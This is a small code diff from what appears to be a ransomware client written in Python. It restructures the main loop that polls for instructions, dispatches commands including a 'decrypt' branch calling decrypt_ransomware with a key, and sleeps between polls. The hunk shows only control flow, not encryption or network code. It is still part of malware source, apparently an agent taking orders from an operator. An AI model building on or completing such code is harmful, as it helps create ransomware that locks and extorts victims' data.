@@ -119,11 +119,11 @@ def main():
                     elif result[1] == 'decrypt': decrypt_ransomware(key = result[2])
 
             if result != 'no_data': reset_instruction()
-
-            if next_step == 'instructions': sleep(10)
-        else:
+        elif not result:
             print(f"[-] Module {next_step} failed!")
             break
+
+        if next_step == 'instructions': sleep(10)
 
 if __name__ == "__main__":
     main()
